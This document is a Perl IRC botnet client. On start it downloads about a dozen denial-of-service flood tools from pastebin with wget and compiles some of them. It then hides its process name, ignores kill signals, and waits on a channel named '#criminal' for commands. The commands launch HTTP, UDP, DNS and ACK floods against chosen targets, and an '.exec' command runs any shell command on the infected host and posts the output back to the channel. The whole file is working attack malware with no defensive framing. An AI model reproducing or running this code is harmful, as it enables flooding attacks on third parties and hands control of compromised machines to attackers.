#!usr/bin/perl

use IO::Socket;
my $processo = '/usr/sbin/d3vil';
my $server  = "irc.acre.gov.br";    # irc     
my $code = int(rand(100000));
my $channel = "#criminal";          # canal
my $port    =   "6667";             # porta        
my $nick    = "s4t4n1c[$code]";     # nick                 

unless (-e "saphyra.py") {
  system("wget https://pastebin.com/raw/UR57fJHc -O saphyra.py");
}

unless (-e "cfbypass.py") {
  system("wget https://pastebin.com/raw/QFJgPp4S -O cfbypass.py");
}

unless (-e "hulk.py") { 
  system("wget https://pastebin.com/raw/gdDMQXWQ -O hulk.py");
}

unless (-e "goldeneye.py") { 
  system("wget https://pastebin.com/raw/eY3C0anh -O goldeneye.py");
}

unless (-e "udp1.pl") { 
  system("wget https://pastebin.com/raw/n399Y8ES -O udp1.pl");
}

unless (-e "std.c") { 
  system("wget https://pastebin.com/raw/3UCGvEnD -O std.c");
  system("gcc std.c -o std -pthread");
}

unless (-e "httpabuse.pl") { 
  system("wget https://pastebin.com/raw/nzmmmQaR -O httpabuse.pl");
}

unless (-e "g3m.c") { 
  system("wget http://pastebin.com/raw/FmmkZfx9 -O g3m.c");
    system("gcc g3m.c -o g3m");
}

unless (-e "rand.pl") { 
  system("wget https://pastebin.com/raw/XqHSJT1J -O rand.pl");
}

unless (-e "DNS.pl") { 
  system("wget https://pastebin.com/raw/ZEeaYZRg -O DNS.pl");
}

unless (-e "ack.pl") { 
  system("wget https://pastebin.com/raw/57pBN7Un -O ack.pl");
}

unless (-e "ufo.pl") { 
  system("wget https://pastebin.com/raw/74vw4erw -O ufo.pl");
}

all();
sub all {
$SIG{'INT'}  = 'IGNORE';
$SIG{'HUP'}  = 'IGNORE';
$SIG{'TERM'} = 'IGNORE';
$SIG{'CHLD'} = 'IGNORE';
$SIG{'PS'}   = 'IGNORE';

$s0ck3t = new IO::Socket::INET(
PeerAddr => $server,
PeerPort => $port,
Proto    => 'tcp'
);
if ( !$s0ck3t ) {
print "\nError\n";
exit 1;
}   

$0 = "$processo" . "\0" x 16;
my $pid = fork;
exit if $pid;
die "Problema com o fork: $!" unless defined($pid);

print $s0ck3t "NICK $nick\r\n";
print $s0ck3t "USER $nick 1 1 1 1\r\n";

print "Online ;)\n\n";
while ( my $log = <$s0ck3t> ) {
      chomp($log);

      if ( $log =~ m/^PING(.*)$/i ) {
        print $s0ck3t "PONG $1\r\n";
	print $s0ck3t "JOIN $channel\r\n";
      }

     if ( $log =~ m/:!saphyra (.*)$/g ){##########
        my $target_saphyra = $1;
        $target_saphyra =~ s/^\s*(.*?)\s*$/$1/;
        $target_saphyra;
        print $s0ck3t "PRIVMSG $channel :67[63SAPHYRA67]61 Attack started at $1, use !stopsad for stop :P \r\n";
        system("nohup python saphyra.py $target_saphyra > /dev/null 2>&1 &");
      }
      
      if ( $log =~ m/:!stopsaphyra/g ){##########
        print $s0ck3t "PRIVMSG $channel :67[63SAPHYRA67]61 Attack sucessfully finished! \r\n";
        system("pkill -9 -f saphyra");
      }

      if ( $log =~ m/:!hulk (.*)$/g ){##########
        my $target_hulk = $1;
        $target_hulk =~ s/^\s*(.*?)\s*$/$1/;
        $target_hulk;
        print $s0ck3t "PRIVMSG $channel :67[63HULK67]61 Attack started at $1, use !stophulk for stop :P \r\n";
        system("nohup python hulk.py $target_hulk > /dev/null 2>&1 &");
      }

      if ( $log =~ m/:!stophulk/g ){##########
        print $s0ck3t "PRIVMSG $channel :67[63HULK67]61 Attack sucessfully finished! \r\n";
        system("pkill -9 -f hulk");
      }

      if ( $log =~ m/:!gold (.*)$/g ){##########
        my $target_gold = $1;
        $target_gold =~ s/^\s*(.*?)\s*$/$1/;
        print $s0ck3t "PRIVMSG $channel :67[63GOLD67]61 Attack started at $1, use !stopgold for stop :P \r\n";
        system("nohup python goldeneye.py $target_gold -w 15 -s 650 > /dev/null 2>&1 &");
      }

      if ( $log =~ m/:!stopgold/g ){##########
        print $s0ck3t "PRIVMSG $channel :67[63GOLD67]61 Attack sucessfully finished! \r\n";
        system("pkill -9 -f goldeneye");
      }

      if ( $log =~ m/:!cfbypass (.*)$/g ){##########
        my $target_cf = $1;
        $target_cf =~ s/^\s*(.*?)\s*$/$1/;
        print $s0ck3t "PRIVMSG $channel :67[63CF-BYPASS67]61 Attack started at $1, use !stopcf for stop :P \r\n";
        system("nohup python cfbypass.py $target_cf > /dev/null 2>&1 &");
      }

      if ( $log =~ m/:!stopcf/g ){##########
        print $s0ck3t "PRIVMSG $channel :67[63CF-BYPASS67]61 Attack sucessfully finished! \r\n";
        system("pkill -9 -f cfbypass");
      }

      if ( $log =~ m/:!udp (.*)$/g ){##########
        my $target_udp = $1;
        print $s0ck3t "PRIVMSG $channel :67[63UDP-FLOOD67]61 Attack started at $target_udp, use !stopudp for stop :P \r\n";
        system("nohup perl udp1.pl $target_udp > /dev/null 2>&1 &");
      }
      if ( $log =~ m/:!stopudp/g ){##########
        print $s0ck3t "PRIVMSG $channel :67[63UDP-FLOOD67]61 Attack sucessfully finished! \r\n";
        system("pkill -9 -f udp1");
      }
	  
      if ( $log =~ m/:!ufo (.*)$/g ){##########
        my $target_ufo = $1;
        my $time_ufo = $2;
        print $s0ck3t "PRIVMSG $channel :67[63UFO67]61 Attack started at $target_ufo, use !stopufo for stop :P \r\n";
        system("nohup perl ufo.pl $target_ufo $time_ufo > /dev/null 2>&1 &");
      }
      if ( $log =~ m/:!stopufo/g ){##########
        print $s0ck3t "PRIVMSG $channel :67[63UFO67]61 Attack sucessfully finished! \r\n";
        system("pkill -9 -f ufo");
      }
	  
     if ( $log =~ m/:!mixy (.*)$/g ){##########
        my $target_mix = $1;
        print $s0ck3t "PRIVMSG $channel :67[63MIXy67]61 Attack started at $target_mix, use !stopmixy for stop :P \r\n";
        system("nohup perl udp1.pl $target_mix > /dev/null 2>&1 &");
	    system("nohup ./std $target_mix 80 999999 > /dev/null 2>&1 &");
        system("nohup perl DNS.pl $target_mix 999999 > /dev/null 2>&1 &");
        system("nohup perl ack.pl $target_mix 999999 > /dev/null 2>&1 &");
	    system("nohup perl rand.pl $target_mix 999999 > /dev/null 2>&1 &");
        system("nohup perl ufo.pl $target_mix 999999 > /dev/null 2>&1 &");
      }
      if ( $log =~ m/:!stopmixy/g ){##########
        print $s0ck3t "PRIVMSG $channel :67[63MIXy67]61 Attack sucessfully finished! \r\n";
        system("pkill -9 -f udp1");
        system("pkill -9 -f std");
        system("pkill -9 -f ack");
        system("pkill -9 -f dns");
        system("pkill -9 -f rand");
        system("pkill -9 -f ufo");
      }

      if ( $log =~ m/:!std (.*)$/g ){##########
        my $target_std = $1;
        my $port_std = $2;
        my $time_std = $3;
        print $s0ck3t "PRIVMSG $channel :67[63STD67]61 Attack started at $target_std, use !stopstd for stop :P \r\n";
        system("nohup ./std $target_std $port_std $time_std > /dev/null 2>&1 &");
      }

      if ( $log =~ m/:!stopstd/g ){##########
        print $s0ck3t "PRIVMSG $channel :67[63STD67]61 Attack sucessfully finished! \r\n";
        system("pkill -9 -f std");
      }

      if ( $log =~ m/:!g3m (.*)$/g ){##########
        my $target_g3m = $1;
        my $port_g3m = $2;
        print $s0ck3t "PRIVMSG $channel :67[63G3M67]61 Attack started at $target_g3m, use !stopg3m for stop :P \r\n";
        system("nohup ./g3m -T3 -I -U -N -p $port_g3m,$port_g3m -h $target_g3m > /dev/null 2>&1 &");
      }

      if ( $log =~ m/:!stopg3m/g ){##########
        print $s0ck3t "PRIVMSG $channel :67[63G3M67]61 Attack sucessfully finished! \r\n";
        system("pkill -9 -f g3m");
      }

    if ( $log =~ m/:!httpabuse (.*)$/g ){##########
        my $target_httpabuse = $1;
        $target_httpabuse =~ s/^\s*(.*?)\s*$/$1/;
        $target_httpabuse;
        print $s0ck3t "PRIVMSG $channel :67[63HTTP-ABUSE67]61 Attack started at $1, use !stopabuse for stop :P \r\n";
        system("nohup perl httpabuse.pl $target_httpabuse 1000 100 GET 13.37 > /dev/null 2>&1 &");
      }
      
      if ( $log =~ m/:!stopabuse/g ){##########
        print $s0ck3t "PRIVMSG $channel :67[63HTTP-ABUSE67]61 Attack sucessfully finished! \r\n";
        system("pkill -9 -f httpabuse");
      }

      if ( $log =~ m/:!dns (.*)$/g ){##########
        my $target_dns = $1;
        my $time_dns = $2;
        print $s0ck3t "PRIVMSG $channel :67[63DNS67]61 Attack started at $target_dns, use !stopdns for stop :P \r\n";
        system("nohup perl DNS.pl $target_dns $time_dns > /dev/null 2>&1 &");
      }
      if ( $log =~ m/:!stopdns/g ){##########
        print $s0ck3t "PRIVMSG $channel :67[63DNS67]61 Attack sucessfully finished! \r\n";
        system("pkill -9 -f DNS");
      }
	  
    if ( $log =~ m/:!rand (.*)$/g ){##########
        my $target_rand = $1;
        my $time_rand = $2;
        print $s0ck3t "PRIVMSG $channel :67[63UDP-RAND67]61 Attack started at $target_rand, use !stoprand for stop :P \r\n";
        system("nohup perl rand.pl $target_rand $time_rand > /dev/null 2>&1 &");
      }
      if ( $log =~ m/:!stoprand/g ){##########
        print $s0ck3t "PRIVMSG $channel :67[63UDP-RAND67]61 Attack sucessfully finished! \r\n";
        system("pkill -9 -f rand");
      }

    if ( $log =~ m/:!ack (.*)$/g ){##########
        my $target_ack = $1;
        my $time_ack = $2;
        print $s0ck3t "PRIVMSG $channel :67[63ACK67]61 Attack started at $target_ack, use !stopack for stop :P \r\n";
        system("nohup perl ack.pl $target_ack $time_ack > /dev/null 2>&1 &");
      }
      if ( $log =~ m/:!stopack/g ){##########
        print $s0ck3t "PRIVMSG $channel :67[63ACK67]61 Attack sucessfully finished! \r\n";
        system("pkill -9 -f ack");
      } 
	  
    if ( $log =~ m/:!stopall/g ){##########
        print $s0ck3t "PRIVMSG $channel :67[63OK67]61 All attacks are killed now! \r\n";
        system("pkill -9 -f saphyra");
        system("pkill -9 -f hulk");
        system("pkill -9 -f goldeneye");
        system("pkill -9 -f cfbypass");
        system("pkill -9 -f udp1");
        system("pkill -9 -f ufo");
        system("pkill -9 -f std");
        system("pkill -9 -f httpabuse");
        system("pkill -9 -f DNS");
        system("pkill -9 -f rand");
        system("pkill -9 -f ack");
      }

      #################################
      # powered by inocent @ pryzraky #
	  #################################

      #################################
      # powered by inocent @ pryzraky #
	  #################################

      #################################
      # powered by inocent @ pryzraky #
	  #################################

      #################################
      # powered by inocent @ pryzraky #
	  #################################

      #################################
      # powered by inocent @ pryzraky #
	  #################################

      if ( $log =~ m/:.exec (.*)$/g ){##########
        my $comando_raw = `$1`;
        open(handler,">rce.tmp");
        print handler $comando_raw;
        close(handler);
	
        open(h4ndl3r,"<","rce.tmp");
        my @commandoarray = <h4ndl3r>;

        foreach my $comando_each (@commandoarray){
          sleep(1);
          print $s0ck3t "PRIVMSG $channel :$comando_each \r\n";
       }
   }
}
}
while(true){
  all();
}
